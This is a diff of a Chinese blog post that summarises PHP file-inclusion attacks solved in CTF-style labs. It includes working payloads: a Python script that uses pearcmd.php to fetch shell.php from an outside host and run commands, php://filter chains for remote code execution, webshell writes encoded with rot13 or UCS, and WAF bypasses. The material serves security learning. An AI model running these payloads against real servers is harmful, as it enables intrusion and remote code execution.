 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">利用 php://<span class="hljs-built_in">filter</span> 链（尤其是 <span class="hljs-built_in">iconv</span> + base64-decode）实现无文件、无写入的远程代码执行（RCE）<br></code></pre></td></tr></table></figure>
 
@@ -1040,7 +1041,7 @@
 <blockquote>
 <p>注意注意这个脚本只适合get传入file参数的时候才能成功</p>
 </blockquote>
-<h3 id="PHP错误信息逐字节读取"><a href="#PHP错误信息逐字节读取" class="headerlink" title="PHP错误信息逐字节读取"></a>PHP错误信息逐字节读取</h3><p>环境：phpinclude_lab:level_17</p>
+<h2 id="错误信息逐字节读取"><a href="#错误信息逐字节读取" class="headerlink" title="错误信息逐字节读取"></a>错误信息逐字节读取</h2><p>环境：phpinclude_lab:level_17</p>
 <p>利用PHP错误信息逐字节读取文件</p>
 <p>服务端的代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;get_flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -1077,7 +1078,7 @@
 <p>脚本通过不断尝试不同的 PHP Filter 链，观察服务器返回的错误信息长度差异，像猜密码一样逐字节推断出文件内容</p>
 <p><img src="/../img/file_include/image-20260412220948929.png" srcset="/img/loading.gif" lazyload alt="image-20260412220948929"></p>
 <p>所以原理知道个大概就可以了，这个使用方法最大的阻碍可能只有网络问题了（手动狗头）</p>
-<h3 id="require-include-once-缺陷"><a href="#require-include-once-缺陷" class="headerlink" title="require&#x2F;include_once 缺陷"></a>require&#x2F;include_once 缺陷</h3><p>众所周知require_once和include_once函数的特点是不能重复包含文件，就算你包含了被这两个函数看到也是无视</p>
+<h2 id="重复文件包含函数"><a href="#重复文件包含函数" class="headerlink" title="重复文件包含函数"></a>重复文件包含函数</h2><p>众所周知require_once和include_once函数的特点是不能重复包含文件，就算你包含了被这两个函数看到也是无视</p>
 <p>想一想会不会有什么方法是可以实现的呢？</p>
 <p>先看到环境的代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;get_flag.php&quot;</span>);<br><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    <br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-keyword">include_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
@@ -1153,7 +1154,7 @@
 <p>如果要对原理研究看如下文章</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">213235</span><span class="hljs-comment">#h2-0</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="opcache缓存RCE"><a href="#opcache缓存RCE" class="headerlink" title="opcache缓存RCE"></a>opcache缓存RCE</h3><p>Opcache 是 PHP 的字节码缓存扩展，通过将编译后的脚本存储在共享内存中，避免重复编译，从而大幅提升 PHP 应用性能</p>
+<h2 id="opcache缓存RCE"><a href="#opcache缓存RCE" class="headerlink" title="opcache缓存RCE"></a>opcache缓存RCE</h2><p>Opcache 是 PHP 的字节码缓存扩展，通过将编译后的脚本存储在共享内存中，避免重复编译，从而大幅提升 PHP 应用性能</p>
 <p>为了方便理解我们可以在自己的docker里面实验一下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -itd --name php7 -p 8083:80 php:7.0-apache<br>进入docker容器：docker <span class="hljs-built_in">exec</span> -it 容器<span class="hljs-built_in">id</span> /bin/bash<br>安装opcache：<span class="hljs-built_in">cd</span> /usr/local/bin &amp;&amp; docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcache<br>重启apache：<span class="hljs-built_in">cd</span> /etc/init.d &amp;&amp; ./apache2 restart<br>docker start 容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
 
@@ -1219,7 +1220,7 @@
 <p>得到flag</p>
 <p><img src="/../img/file_include/image-20260413100226666.png" srcset="/img/loading.gif" lazyload alt="image-20260413100226666"></p>
 <p>这个特性就结束了，接下来继续</p>
-<h3 id="pearcmd-php的妙用"><a href="#pearcmd-php的妙用" class="headerlink" title="pearcmd.php的妙用"></a>pearcmd.php的妙用</h3><p>这里有一篇专门研究这个的文章</p>
+<h2 id="pearcmd-php妙用"><a href="#pearcmd-php妙用" class="headerlink" title="pearcmd.php妙用"></a>pearcmd.php妙用</h2><p>这里有一篇专门研究这个的文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
 <p>在这里我只简要的讲一个这个漏洞产生的原因</p>
 <p>在PHP中，有一个register_argc_argv指令。当它开启时（在Docker的PHP镜像中默认开启），HTTP请求的查询字符串（Query String）（即?之后的部分）会被PHP解析，并存入$_SERVER[‘argv’]数组中。更关键的是，它会以加号（+）作为参数分隔符，而不是常规的&amp;。这就像是给Web环境装上了命令行参数解析器。</p>
@@ -1281,7 +1282,7 @@
 <p>尝试使用python发包(比较的优雅)</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> requests<br><br>host = <span class="hljs-string">&quot;192.168.8.133&quot;</span><br>port = <span class="hljs-number">8123</span><br><br><span class="hljs-comment"># 注意：路径中使用单引号，避免双引号转义问题</span><br>path = <span class="hljs-string">&quot;/?+install+-R+/var/www/html+http://10.10.109.40/shell.php&quot;</span><br><br><span class="hljs-comment"># 构造请求报文（与 Burp 中一致，不编码）</span><br>request = (<br>    <span class="hljs-string">f&quot;POST <span class="hljs-subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span><br>    <span class="hljs-string">f&quot;Host: <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>\r\n&quot;</span><br>    <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br>    <span class="hljs-string">&quot;Content-Length: 35\r\n&quot;</span><br>    <span class="hljs-string">&quot;Connection: close\r\n&quot;</span><br>    <span class="hljs-string">&quot;\r\n&quot;</span><br>    <span class="hljs-string">&quot;file=/usr/local/lib/php/pearcmd.php&quot;</span><br>)<br><br><span class="hljs-comment"># 发送</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.connect((host, port))<br>sock.send(request.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))  <span class="hljs-comment"># 使用 latin-1 保留原始字节</span><br><br><span class="hljs-comment"># 接收响应（循环读取直到连接关闭）</span><br>response = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    chunk = sock.recv(<span class="hljs-number">4096</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>        <span class="hljs-keyword">break</span><br>    response += chunk<br>sock.close()<br><br><span class="hljs-comment"># 打印响应（按需解码，可能包含 gzip 压缩，此处简单输出）</span><br><span class="hljs-built_in">print</span>(response.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br>r = requests.get(<span class="hljs-string">&#x27;http://192.168.8.133:8123/tmp/pear/download/shell.php&#x27;</span>,params=&#123;<span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
 
-<h3 id="Fastcgi产生临时文件"><a href="#Fastcgi产生临时文件" class="headerlink" title="Fastcgi产生临时文件"></a>Fastcgi产生临时文件</h3><p>学习的文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
+<h2 id="Fastcgi产生临时文件"><a href="#Fastcgi产生临时文件" class="headerlink" title="Fastcgi产生临时文件"></a>Fastcgi产生临时文件</h2><p>学习的文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
 <p>环境phpinclude_lab:level_22 </p>
 <p>看到环境代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HelloCTF_WAF</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/iconv/i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;WAF&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>  &#125;<br>  &#125;<br><br>  (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;read&#x27;</span> ) === <span class="hljs-string">&#x27;read&#x27;</span> ? <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">HelloCTF_WAF</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ?? <span class="hljs-string">&#x27;index.php&#x27;</span>) : <span class="hljs-keyword">include_once</span>(<span class="hljs-title function_ invoke__">HelloCTF_WAF</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ?? <span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -1313,7 +1314,7 @@
 
 <p>设置好URL和payload就可以直接执行了</p>
 <p>执行之后会这个代码就会不断的包含句柄的文件在文件删除之前写入webshell，然后执行得到结果</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="双重URL编码"><a href="#双重URL编码" class="headerlink" title="双重URL编码"></a>双重URL编码</h4><p>看到服务端代码</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="双重URL编码"><a href="#双重URL编码" class="headerlink" title="双重URL编码"></a>双重URL编码</h3><p>看到服务端代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;get_flag.php&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello_ctf</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base|string/i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;WAF&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;php://filter/&quot;</span>.<span class="hljs-variable">$file</span>);<br>  &#125;<br><br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-title function_ invoke__">hello_ctf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) : <span class="hljs-title function_ invoke__">phpinfo</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>对于这个就是过滤了使用base64和rot13</p>
@@ -1325,6 +1326,91 @@
 <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource=flag.php<br></code></pre></td></tr></table></figure>
 
 <p>这里有一个要注意的地方，使用python的时候，request.get是会强制把我们输入的参数URL编码一次，所以我们在python中的payload只需要URL编码一次就可以达到URL编码两次的结果</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>服务端的代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>r = requests.get(url,params=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;pphphp://filter/convert.base64-encode/resource=flag.txt&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>还是使用上面的那个代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个是可以使用大小写绕过的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>r = requests.get(url,params=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;phP://filter/convert.base64-encode/resource=flag.txt&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>但是服务端如果使用大小写区分则不行了</p>
+<p>类似于下面这些代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="死亡函数新思路"><a href="#死亡函数新思路" class="headerlink" title="死亡函数新思路"></a>死亡函数新思路</h2><h3 id="死亡函数逻辑一"><a href="#死亡函数逻辑一" class="headerlink" title="死亡函数逻辑一"></a>死亡函数逻辑一</h3><blockquote>
+<p>这一部分介绍死亡函数绕过的新思路，还有死亡函数设置的别的情况</p>
+</blockquote>
+<p>在前面我们已经知道了绕过死亡函数可以使用过滤器绕过比如base64，rot13，iconv等等</p>
+<p>但是现在我在这里介绍一个新的思路</p>
+<p>服务端的代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意哦这个代码和之前的死亡函数绕过的代码有一点点的不一样</p>
+<p>这个代码是需要闭合死亡函数的</p>
+<p>好的，那么如果不使用base64，不使用rot13，不使用iconv的话还能怎么操作呢？</p>
+<p>答案是！使用.htaccess文件或者是使用.user.ini文件！</p>
+<p>先看.htaccess文件用法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>r = requests.get(url,params=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;php://filter/write=string.strip_tags/resource=.htaccess&#x27;</span>,<span class="hljs-string">&#x27;content&#x27;</span>:<span class="hljs-string">&#x27;?&gt;php_value auto_prepend_file flag.txt&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到使用的主要方法是写入文件内容，使用的是写入流</p>
+<p><code>php://filter/write=string.strip_tags/resource=.htaccess</code>这个是可以在当前目录下面创建一个.htaccess文件,学习过文件上传的都知道这个文件是一个当前目录的配置文件，可以制定一些规则</p>
+<p><code>?&gt;php_value auto_prepend_file flag.txt</code>然后再看到这个内容，这个内容的前面?&gt;是为了包裹死亡函数，是为了方便php伪协议filter&#x2F;write&#x3D;string.strip_tags识别到标签后取出死亡函数，后面的内容是.htaccess文件的配置选项<code>php_value auto_prepend_file</code>的作用是：在每个 PHP 脚本执行之前，自动将指定的文件包含进来，这样就很明白了，包裹的文件内容是会显示在页面上面的</p>
+<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 flag.php flag &#x2F;flag &#x2F;flag.php 等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器</p>
+<blockquote>
+<p>使用.htaccess文件是立刻生效的，但是在使用这个方法 的时候会遇到一些环境问题，比如php的模式，httpd.conf文件的配置，这些都是要是配置的</p>
+</blockquote>
+<p>当然学过文件上传的同学可以知道不止.htaccess文件可以利用，.user.ini文件也具有差不多的特性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>r = requests.get(url,params=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;php://filter/write=string.strip_tags/resource=.user.ini&#x27;</span>,<span class="hljs-string">&#x27;content&#x27;</span>:<span class="hljs-string">&#x27;?&gt;auto_prepend_file = flag.txt&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>意思是一样的</p>
+<blockquote>
+<p>只是这个.user.ini文件是不会立刻生效的，<code>.user.ini</code> 的修改会<strong>在 5 分钟内自动生效</strong></p>
+</blockquote>
+<p>所以执行完之后要等一会</p>
+<h3 id="死亡函数逻辑二"><a href="#死亡函数逻辑二" class="headerlink" title="死亡函数逻辑二"></a>死亡函数逻辑二</h3><p>逻辑一很好理解，但是如果服务端的代码逻辑是如下呢</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>对于这种情况我们还是可以使用.htaccess文件利用</p>
+<p>payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?content=php:<span class="hljs-comment">//filter/write=string.strip_tags/?&gt;php_value%20auto_prepend_file%20flag.txt%0a%23/resource=.htaccess</span><br></code></pre></td></tr></table></figure>
+
+<p>url解码之后的结果如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?content=php:<span class="hljs-comment">//filter/write=string.strip_tags/?&gt;php_value auto_prepend_file flag.txt</span><br><span class="hljs-comment">#/resource=.htaccess</span><br></code></pre></td></tr></table></figure>
+
+<p>.htaccess文件内容如下</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_prepend_file flag.txt<br><span class="hljs-comment">#/resource=.htaccess</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现</p>
+<p><code>?&gt;php_value%20auto_prepend_file%20flag.txt%0a%23</code>这个内容是夹在<code>/write=string.strip_tags/</code>与<code>/resource=.htaccess</code>之间的，实际上是php在读取的时候到了<code>/write=string.strip_tags/</code>就停止了，所以导致写入的文件内容是</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_prepend_file flag.txt<br><span class="hljs-comment">#/resource=.htaccess</span><br></code></pre></td></tr></table></figure>
+
+<p>同理使用.user.ini文件也是可以的</p>
+<p>payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?content=php:<span class="hljs-comment">//filter/write=string.strip_tags/?&gt;auto_prepend_file%20=%20flag.txt%0a%23/resource=.user.ini</span><br></code></pre></td></tr></table></figure>
+
+<p>当然思路千千万</p>
+<p>rot13也是可以的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">这里可以采用rot13编码即可；<br><br>php:<span class="hljs-comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php这里&lt;?php phpinfo();?&gt;的rot13编码即为&lt;?cuc cucvasb();?&gt;,所以这里可以进行写入；</span><br></code></pre></td></tr></table></figure>
+
+<p>usc-2也可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">通过usc-<span class="hljs-number">2</span>的编码进行转换；对目标字符串进行<span class="hljs-number">2</span>位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）<br>payload：php:<span class="hljs-comment">//filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php;其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱</span><br></code></pre></td></tr></table></figure>
+
+<p>usc-4也是可以的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">活用convert.iconv。可以进行usc-<span class="hljs-number">4</span>编码转化；就是<span class="hljs-number">4</span>位一反转；类比可知，构造的shell代码应该是usc-<span class="hljs-number">4</span>中的<span class="hljs-number">4</span>倍数；<br>通过测试我们可以明确的看到确实是需要是<span class="hljs-number">4</span>的倍数才可以进行，否则会进行报错；<br><br>payload：php:<span class="hljs-comment">//filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php荷载效果如下：</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7758#toc-3">file_put_content和死亡·杂糅代码之缘-先知社区</a></p>
+<p>这个文章里面有两个方法是使用不了的</p>
+<p>base64和utf-8与utf-7之间的转化</p>
+<blockquote>
+<p>构造起来有点困难所以，哎………没有了后文</p>
+</blockquote>
 
                 
               </div>
@@ -1386,7 +1472,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>文件包含漏洞手法总结</div>
-      <div>https://exploreio.github.io/2026/04/10/file_include/</div>
+      <div>https://exploreio.github.io/2026/04/13/file_include/</div>
     </div>
     <div class="license-meta">
       
@@ -1398,7 +1484,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年4月10日</div>
+          <div>2026年4月13日</div>
         </div>
       
       
@@ -1769,23 +1855,23 @@
   </noscript>
 <!-- hexo injector body_end start -->
